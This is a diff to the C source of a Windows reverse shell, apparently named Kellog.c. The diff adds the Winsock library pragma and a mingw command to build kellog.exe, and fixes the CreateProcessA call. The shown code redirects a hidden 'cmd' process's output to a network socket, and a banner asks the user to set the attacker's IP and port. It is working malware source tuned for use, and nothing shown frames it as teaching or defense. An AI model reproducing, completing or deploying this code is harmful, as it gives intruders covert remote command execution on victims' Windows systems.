@@ -7,6 +7,12 @@
 #include <stdlib.h>
 #include <string.h>
 
+#pragma comment(lib,"ws2_32")
+
+/*
+i686-w64-mingw32-g++ -static-libstdc++ -static-libgcc -o kellog.exe Kellog.c
+*/
+
 /* ================================================== */
 /* |     CHANGE THIS TO THE CLIENT IP AND PORT      | */
 /* ================================================== */
@@ -54,7 +60,8 @@ int main(void) {
 	sinfo.hStdOutput = (HANDLE)sockt;
 	sinfo.hStdError = (HANDLE)sockt;
 	PROCESS_INFORMATION pinfo;
-	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
+	char test[]= "cmd";
+	CreateProcessA(NULL,test, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
 
 	return (0);
 }
